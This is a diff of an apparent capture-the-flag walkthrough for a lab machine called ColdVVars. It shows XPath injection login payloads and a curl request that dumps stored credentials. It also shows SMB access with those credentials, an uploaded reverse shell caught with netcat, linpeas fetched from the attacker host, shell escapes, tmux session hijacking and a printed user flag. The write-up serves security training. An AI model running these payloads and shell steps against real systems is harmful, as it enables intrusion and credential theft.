@@ -155,12 +155,12 @@ xx.xxx.xx.xxx    coldvvars.thm
 <img width="1066" height="561" alt="image" src="https://github.com/user-attachments/assets/ec32beac-3efc-4df7-8916-73d66105f9dd" />
 
 <br>
-<h3>' OR 1=1</h3>
+<h3><code>' OR 1=1</code></h3>
 <p
 
-- <code>' OR 1=1</code> --> <code>Username or Password Wrong</code><br>
+- <code>' OR 1=1</code> = <code>Username or Password Wrong</code><br>
 - POST ... <code>username=%27+or+1%3D1&password=&submit=Login</code><br>
-- 200 OK ... X-Powered-By: Express ... ETag</p>
+- 200 OK ... <code>X-Powered-By</code>: <code>Express</code> ... ETag</p>
 
 <img width="1260" height="333" alt="image" src="https://github.com/user-attachments/assets/516ff623-8e4b-4f4a-bafc-f9a7c5ed7401" />
 
@@ -168,15 +168,19 @@ xx.xxx.xx.xxx    coldvvars.thm
 
 <img width="955" height="244" alt="image" src="https://github.com/user-attachments/assets/015d22e3-eece-4496-9ccd-97a0683a33fb" />
 
-
-<h3>' OR 1=1 and password</h3>
+<br>
+<h3><code>' OR 1=1</code> : <code>password</code></h3>
 <p
 
 - <code>' OR 1=1</code> and password--> <code>Username or Password Wrong</code><br>
-- POST ... <code>username=%27+or+1%3D1&password=password&submit=Logi</code><br>
+- POST ... <code>username=%27+or+1%3D1&password=password&submit=Login</code><br>
 - 200 OK ... X-Powered-By: Express ... ETag</p>
 
+<br>
+
 <img width="1255" height="370" alt="image" src="https://github.com/user-attachments/assets/cd212a65-5229-41d8-8793-54a7bbc6a131" />
+
+<br>
 
 <p>It´s vulnerable to <code>XPath Injection.</code></p>
 
@@ -186,17 +190,50 @@ xx.xxx.xx.xxx    coldvvars.thm
 :~/ColdVVars# nxc smb coldvvars.thm -u guest -p ''
 ```
 
+<br>
+
 <img width="1131" height="93" alt="image" src="https://github.com/user-attachments/assets/8ff283e7-165c-45ef-84f6-386eccb977e5" />
 
+<br>
+<br>
+<h3><code>admin"or 1=1 or ""="</code></h3>
+
+```bash
+Username Password
+Tove Jani
+Godzilla KONGistheKING
+SuperMan snyderCut
+ArthurMorgan DeadEye
+```
+
+<img width="1276" height="277" alt="image" src="https://github.com/user-attachments/assets/cee1ce23-f489-4ea9-b0fe-6b69115dc9b9" />
+
+<br>
+
+<img width="1270" height="401" alt="image" src="https://github.com/user-attachments/assets/1510253e-a411-4279-af0c-f0be8c57e1a6" />
+
+<br>
+<br>
+<h3>for the same purpose ...</h3>
+
+```bash
+POST /login HTTP/1.1
+...
+username=admin%22or+1%3D1+or+%22%22%3D%22&password=&submit=Login
+```
 
 <br>
 
 ```bash
-# curl -X POST -d $'username=\" or 1=1 or \"a\"=\"a&password=a&submit=Login' 'http://coldvvars.thm:8082/Login'
+# curl -X POST -d 'username=admin%22or+1%3D1+or+%22%22%3D%22&password=&submit=Login' 'http://coldvvars.thm:8082/Login'
 Username Password<br>Tove             Jani<br>Godzilla             KONGistheKING<br>SuperMan             snyderCut<br>ArthurMorgan             DeadEye<br>
 ```
 
-<img width="1282" height="70" alt="image" src="https://github.com/user-attachments/assets/959858a3-60ae-4f8d-9373-8f75fd0524d7" />
+<img width="1744" height="132" alt="image" src="https://github.com/user-attachments/assets/9bc55124-f0f7-495b-901c-d7b7951fde56" />
+
+<br>
+
+<p>OR ...</p>
 
 <br>
 <img width="1282" height="70" alt="image" src="https://github.com/user-attachments/assets/47a696af-d369-48d0-93e8-26627613a445" />
@@ -209,6 +246,9 @@ SMB         xx.xxx.xx.xxx   445    IP-xx-xx-xx-xxx [+] ec2.internal\ArthurMorgan
 
 <img width="1278" height="152" alt="image" src="https://github.com/user-attachments/assets/85516a66-552a-4d25-b5f2-06d1c2737c8b" />
 
+<br>
+<h3>Reverse Shell</h3>
+
 ```bash
 :~/ColdVVars# smbclient //coldvvars.thm/SECURED -U ArthurMorgan
 Password for [WORKGROUP\ArthurMorgan]:
@@ -218,19 +258,16 @@ putting file rev.txt as \rev.txt (1788.7 kb/s) (average 1788.7 kb/s)
 smb: \>
 ```
 
+<br>
 
 ```bash
 http://coldvvars.thm:8080/dev/rev.txt
 ```
-
-
+<br>
 
 ```bash
 :~/ColdVVars# nc -nlvp 9001
-Listening on 0.0.0.0 9001
-Connection received on 10.201.23.173 59956
-Linux ip-10-201-23-173 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
- 18:45:59 up  1:15, 19 users,  load average: 0.00, 0.00, 0.00
+...
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 marston  pts/0    tmux(925).%0     17:31    1:14m  0.05s  0.05s -bash
 marston  pts/1    tmux(925).%1     17:31    1:14m  0.05s  0.05s -bash
@@ -258,40 +295,40 @@ www-data
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@ip-10-201-23-173:/$ ^Z
 [1]+  Stopped                 nc -nlvp 9001
-root@ip-10-201-46-109:~/ColdVVars# stty -echo raw;fg
+:~/ColdVVars# stty -echo raw;fg
 nc -nlvp 9001
 
-www-data@ip-10-201-23-173:/$ export TERM=xterm
-www-data@ip-10-201-23-173:/$ cd /home
-www-data@ip-10-201-23-173:/home$ ls
+www-data@ip-xx-xxx-xx-xxx:/$ export TERM=xterm
+www-data@ip-xx-xxx-xx-xxx:/$ cd /home
+www-data@ip-xx-xxx-xx-xxx:/home$ ls
 ArthurMorgan  marston  ssm-user  ubuntu
 ```
 
 
 ```bash
-www-data@ip-10-201-23-173:/home$ su ArthurMorgan
+www-data@ip-xx-xxx-xx-xxx:/home$ su ArthurMorgan
 Password: 
 $ whoami
 ArthurMorgan
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
-ArthurMorgan@ip-10-201-23-173:/home$ export TERM=xterm
+ArthurMorgan@ip-xx-xxx-xx-xxx:/home$ export TERM=xterm
 ArthurMorgan@ip-10-201-23-173:/home$ ls
 ArthurMorgan  marston  ssm-user  ubuntu
-ArthurMorgan@ip-10-201-23-173:/home$ cd ArthurMorgan
-ArthurMorgan@ip-10-201-23-173:~$ ls
+ArthurMorgan@ip-xx-xxx-xx-xxx:/home$ cd ArthurMorgan
+ArthurMorgan@ip-xx-xxx-xx-xxx:~$ ls
 ideas  user.txt
-ArthurMorgan@ip-10-201-23-173:~$ cat user.txt
+ArthurMorgan@ip-xx-xxx-xx-xxx:~$ cat user.txt
 ae39f419ce0a3a26f15db5aaa7e446ff
 ```
 
 ```bash
-ArthurMorgan@ip-10-201-23-173:~$ sudo -l
+ArthurMorgan@ip-xx-xxx-xx-xxx:~$ sudo -l
 [sudo] password for ArthurMorgan: 
-Sorry, user ArthurMorgan may not run sudo on ip-10-201-23-173.
+Sorry, user ArthurMorgan may not run sudo on ip-xx-xxx-xx-xxx.
 ```
 
 ```bash
-ArthurMorgan@ip-10-201-23-173:~$ find / -perm -4000 -user root -type f 2>/dev/null
+ArthurMorgan@iip-xx-xxx-xx-xxx:~$ find / -perm -4000 -user root -type f 2>/dev/null
 /snap/snapd/23771/usr/lib/snapd/snap-confine
 /snap/snapd/24718/usr/lib/snapd/snap-confine
 /snap/core20/2599/usr/bin/chfn
@@ -336,7 +373,7 @@ ArthurMorgan@ip-10-201-23-173:~$ find / -perm -4000 -user root -type f 2>/dev/nu
 ```
 
 ```bash
-ArthurMorgan@ip-10-201-23-173:~$ getent hosts
+ArthurMorgan@ip-xx-xxx-xx-xxx:~$ getent hosts
 127.0.0.1       localhost
 127.0.1.1       incognito
 127.0.0.1       ip6-localhost ip6-loopback
@@ -344,7 +381,7 @@ ArthurMorgan@ip-10-201-23-173:~$ getent hosts
 
 
 ```bash
-ArthurMorgan@ip-10-201-23-173:~$ netstat -tunlp
+ArthurMorgan@ip-xx-xxx-xx-xxx:~$ netstat -tunlp
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 Active Internet connections (only servers)
@@ -370,7 +407,7 @@ udp        0      0 0.0.0.0:138             0.0.0.0:*                           
 
 
 ```bash
-ArthurMorgan@ip-10-201-23-173:~$ getent hosts
+ArthurMorgan@ip-xx-xxx-xx-xxx:~$ getent hosts
 127.0.0.1       localhost
 127.0.1.1       incognito
 127.0.0.1       ip6-localhost ip6-loopback
@@ -383,13 +420,13 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 
 ```bash
-ArthurMorgan@ip-10-201-23-173:/dev/shm$ wget http://10.201.46.109:8000/linpeas.sh
+ArthurMorgan@ip-xx-xxx-xx-xxx:/dev/shm$ wget http://xx.xxx.xx.xxx:8000/linpeas.sh
 ...
-ArthurMorgan@ip-10-201-23-173:/dev/shm$ chmod +x linpeas.sh
-ArthurMorgan@ip-10-201-23-173: ./linpeas.sh -a
+ArthurMorgan@ip-xx-xxx-xx-xxx:/dev/shm$ chmod +x linpeas.sh
+ArthurMorgan@ip-xx-xxx-xx-xxx: ./linpeas.sh -a
 ```
 
-
+<br>
 
 <img width="1261" height="751" alt="image" src="https://github.com/user-attachments/assets/8ac98e34-0b76-441d-93c0-4ae917d490c4" />
 
@@ -397,11 +434,10 @@ ArthurMorgan@ip-10-201-23-173: ./linpeas.sh -a
 
 <img width="1269" height="130" alt="image" src="https://github.com/user-attachments/assets/2b89321b-91c2-4051-bf4e-150b35a74507" />
 
-
-
+<br>
 
 ```bash
-ArthurMorgan@ip-10-201-23-173:/dev/shm$ nc -nlvp 4545
+ArthurMorgan@ip-xx-xxx-xx-xxx:/dev/shm$ nc -nlvp 4545
 ```
 
 <img width="1263" height="183" alt="image" src="https://github.com/user-attachments/assets/065658b1-e97d-41eb-a908-13c89bfbc4bf" />
@@ -410,7 +446,7 @@ ArthurMorgan@ip-10-201-23-173:/dev/shm$ nc -nlvp 4545
 
 
 ```bash
-ArthurMorgan@ip-10-201-23-173:/dev/shm$ nc -nlvp 4545
+ArthurMorgan@ip-xx-xxx-xx-xxx:/dev/shm$ nc -nlvp 4545
 ```
 
 <p>
@@ -425,9 +461,9 @@ ArthurMorgan@ip-10-201-23-173:/dev/shm$ nc -nlvp 4545
 :!/bin/bash
 :!/bin/bash
 python -c 'import pty; pty.spawn("/bin/bash")'
-marston@ip-10-201-23-173:~$ whoami
+marston@ip-xx-xxx-xx-xxx:~$ whoami
 marston
-marston@ip-10-201-23-173:~$ ls -lah
+marston@ip-xx-xxx-xx-xxx:~$ ls -lah
 ls -lah
 total 56K
 drwxr-xr-x 8 marston marston 4.0K Aug 11 19:15 .
@@ -449,17 +485,17 @@ drwx------ 2 marston marston 4.0K Mar 23  2021 .ssh
 
 
 ```bash
-marston@ip-10-201-23-173:~$ export TERM=xterm-256color
+marston@ip-xx-xxx-xx-xxx:~$ export TERM=xterm-256color
 ```
 
 ```bash
-marston@ip-10-201-23-173:~$ tmux ls
+marston@ip-xx-xxx-xx-xxx:~$ tmux ls
 0: 9 windows (created Mon Aug 11 17:31:09 2025)
 ```
 
 
 ```bash
-marston@ip-10-201-23-173:~$ tmux attach -t 0
+marston@ip-xx-xxx-xx-xxx:~$ tmux attach -t 0
 ```
 
 
